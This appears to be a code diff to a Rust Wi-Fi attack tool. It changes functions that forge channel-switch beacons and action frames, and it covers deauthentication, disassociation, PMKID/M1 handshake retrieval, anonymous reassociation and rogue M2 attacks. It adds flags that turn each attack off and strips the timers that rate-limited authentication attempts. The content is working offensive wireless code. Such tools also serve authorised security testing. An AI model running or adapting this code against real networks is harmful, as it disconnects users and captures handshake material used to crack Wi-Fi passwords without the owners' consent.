@@ -18,9 +18,10 @@ use crate::{
     status::{MessageType, StatusMessage},
     tx::{
         build_association_request_rg, build_authentication_frame_noack,
-        build_authentication_frame_with_params, build_csa_beacon, build_deauthentication_fm_ap,
-        build_deauthentication_fm_client, build_disassocation_from_ap,
-        build_disassocation_from_client, build_probe_response, build_reassociation_request,
+        build_authentication_frame_with_params, build_csa_action, build_csa_beacon,
+        build_deauthentication_fm_ap, build_deauthentication_fm_client,
+        build_disassocation_from_ap, build_disassocation_from_client, build_probe_response,
+        build_reassociation_request,
     },
     write_packet, OxideRuntime,
 };
@@ -36,6 +37,10 @@ use crate::{
 //////////////////////////////////////////////////////////////
 
 pub fn csa_attack(oxide: &mut OxideRuntime, mut beacon: Beacon) -> Result<(), String> {
+    if oxide.config.disable_csa {
+        return Ok(());
+    }
+
     let channel = oxide.get_adjacent_channel();
     let binding = beacon.clone();
     let ap_mac = binding.header.src().unwrap();
@@ -64,25 +69,48 @@ pub fn csa_attack(oxide: &mut OxideRuntime, mut beacon: Beacon) -> Result<(), St
     if channel.is_none() {
         return Ok(());
     }
-    let new_channel = channel.unwrap();
+
+    let new_channel = 14;
 
     // If we are transmitting
     if !oxide.config.notx {
-        for _ in 0..4 {
-            let frx = build_csa_beacon(beacon.clone(), new_channel);
-            beacon = if let Frame::Beacon(bcn) = parse_frame(&frx[10..], false).unwrap() {
-                bcn
-            } else {
-                return Ok(());
-            };
+        let random_client = ap_data
+            .client_list
+            .get_random()
+            .map(|client| client.mac_address);
+
+        // Send a CSA action frame to a random client
+        if let Some(client) = random_client {
+            let frx = build_csa_action(&client, &ap_data.mac_address, new_channel);
+            let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
+            oxide.status_log.add_message(StatusMessage::new(
+                MessageType::Info,
+                format!(
+                    "CSA Attack (Action): {} => {} ({}) Channel: {}",
+                    ap_mac,
+                    client,
+                    beacon
+                        .station_info
+                        .ssid
+                        .clone()
+                        .unwrap_or("Hidden".to_string()),
+                    new_channel
+                ),
+            ));
+        }
+
+        // Send beacons too
+        for _ in 0..10 {
+            let frx = build_csa_beacon(beacon.clone(), new_channel.into());
             let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
         }
+
         ap_data.interactions += 1;
         ap_data.auth_sequence.state = 1;
         oxide.status_log.add_message(StatusMessage::new(
             MessageType::Info,
             format!(
-                "CSA Attack: {} ({}) Channel: {}",
+                "CSA Attack (Beacon*10): {} ({}) Channel: {}",
                 ap_mac,
                 beacon.station_info.ssid.unwrap_or("Hidden".to_string()),
                 new_channel
@@ -104,6 +132,10 @@ pub fn csa_attack(oxide: &mut OxideRuntime, mut beacon: Beacon) -> Result<(), St
 //////////////////////////////////////////////////////////////
 
 pub fn disassoc_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<(), String> {
+    if oxide.config.disable_disassoc {
+        return Ok(());
+    }
+
     let ap_data = if let Some(dev) = oxide.access_points.get_device(ap_mac) {
         dev
     } else {
@@ -187,6 +219,10 @@ pub fn disassoc_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<
 
 /// M1 Retrieval Attack Phase 1
 pub fn m1_retrieval_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<(), String> {
+    if oxide.config.disable_pmkid {
+        return Ok(());
+    }
+
     if oxide.config.notx {
         return Ok(());
     }
@@ -218,18 +254,6 @@ pub fn m1_retrieval_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Res
         return Ok(());
     }
 
-    // If the interaction cooldown isn't timed out (aka timer1).
-    if !ap_data.auth_sequence.is_t1_timeout() {
-        return Ok(());
-    }
-
-    // At this point we know it has been 5 seconds since we last interacted.
-
-    // Check state of auth sequence to ensure we are in the right order.
-    if ap_data.auth_sequence.state > 0 {
-        ap_data.auth_sequence.state = 0; // If t1 is timed out, we gotta reset to state 0.
-    }
-
     // If we already have an M1 for this AP, don't re-attack.
     if oxide.handshake_storage.has_m1_for_ap(ap_mac) {
         return Ok(());
@@ -257,13 +281,12 @@ pub fn m1_retrieval_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Res
     };
 
     // If we are transmitting
-    if !oxide.config.notx {
-        let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
-        ap_data.interactions += 1;
-        ap_data.auth_sequence.state = 1;
-        ap_data.update_t1_timer();
-        ap_data.update_t2_timer();
-    }
+    let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
+    ap_data.interactions += 1;
+    oxide.status_log.add_message(StatusMessage::new(
+        MessageType::Info,
+        format!("M1 Retrieval - sent authentication [{}]", ap_mac),
+    ));
 
     Ok(())
 }
@@ -274,6 +297,10 @@ pub fn m1_retrieval_attack_phase_2(
     client_mac: &MacAddress,
     oxide: &mut OxideRuntime,
 ) -> Result<(), String> {
+    if oxide.config.disable_pmkid {
+        return Ok(());
+    }
+
     if oxide.config.notx {
         return Ok(());
     }
@@ -282,33 +309,26 @@ pub fn m1_retrieval_attack_phase_2(
     let ap_data = if let Some(ap) = oxide.access_points.get_device(ap_mac) {
         ap
     } else {
+        oxide.status_log.add_message(StatusMessage::new(
+            MessageType::Info,
+            format!("M1 Retrieval - no AP [{}]", ap_mac),
+        ));
         return Ok(());
     };
 
     if !oxide.target_data.targets.is_target(ap_data) {
+        oxide.status_log.add_message(StatusMessage::new(
+            MessageType::Info,
+            format!("M1 Retrieval - not a target? [{}]", ap_mac),
+        ));
         return Ok(());
     }
 
     if oxide.target_data.whitelist.is_whitelisted(ap_data) {
-        return Ok(());
-    }
-
-    // Is our sequence state 1?
-    if ap_data.auth_sequence.state != 1 {
-        return Ok(());
-    }
-
-    // It's been more than 5 seconds since our last interaction
-    if ap_data.auth_sequence.is_t1_timeout() {
-        // Reset state to 0 and update timers.
-        if ap_data.auth_sequence.state > 0 {
-            ap_data.auth_sequence.state = 0;
-            ap_data.update_t2_timer();
-            oxide.status_log.add_message(StatusMessage::new(
-                MessageType::Info,
-                format!("{} state reset to 0.", ap_mac),
-            ));
-        }
+        oxide.status_log.add_message(StatusMessage::new(
+            MessageType::Info,
+            format!("M1 Retrieval - is whitelisted? [{}]", ap_mac),
+        ));
         return Ok(());
     }
 
@@ -321,7 +341,7 @@ pub fn m1_retrieval_attack_phase_2(
     } else {
         RsnCipherSuite::CCMP
     };
-    let gs = if ap_data.information.gs_tkip.is_some_and(|f| f) {
+    let gs: RsnCipherSuite = if ap_data.information.gs_tkip.is_some_and(|f| f) {
         RsnCipherSuite::TKIP
     } else {
         RsnCipherSuite::CCMP
@@ -337,14 +357,13 @@ pub fn m1_retrieval_attack_phase_2(
         vec![cs],
     );
 
-    if !oxide.config.notx {
-        ap_data.auth_sequence.state = 2;
-        ap_data.update_t1_timer(); // We interacted
-        ap_data.update_t2_timer(); // We changed state
+    let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
+    ap_data.interactions += 1;
+    oxide.status_log.add_message(StatusMessage::new(
+        MessageType::Info,
+        format!("M1 Retrieval - sent association [{}]", ap_mac),
+    ));
 
-        let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
-        ap_data.interactions += 1;
-    }
     Ok(())
 }
 
@@ -362,7 +381,7 @@ pub fn m1_retrieval_attack_phase_2(
 //////////////////////////////////////////////////////////////
 
 pub fn deauth_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<(), String> {
-    if !oxide.config.deauth {
+    if oxide.config.disable_deauth {
         return Ok(());
     }
 
@@ -467,6 +486,10 @@ pub fn anon_reassociation_attack(
     oxide: &mut OxideRuntime,
     ap_mac: &MacAddress,
 ) -> Result<(), String> {
+    if oxide.config.disable_anon {
+        return Ok(());
+    }
+
     if oxide
         .handshake_storage
         .has_complete_handshake_for_ap(ap_mac)
@@ -570,6 +593,10 @@ pub fn rogue_m2_attack_directed(
     oxide: &mut OxideRuntime,
     probe: ProbeRequest,
 ) -> Result<(), String> {
+    if oxide.config.disable_roguem2 {
+        return Ok(());
+    }
+
     // make sure TX is enabled
     if oxide.config.notx {
         return Ok(());
@@ -633,6 +660,10 @@ pub fn rogue_m2_attack_undirected(
     oxide: &mut OxideRuntime,
     probe: ProbeRequest,
 ) -> Result<(), String> {
+    if oxide.config.disable_roguem2 {
+        return Ok(());
+    }
+
     // make sure TX is enabled
     if oxide.config.notx {
         return Ok(());
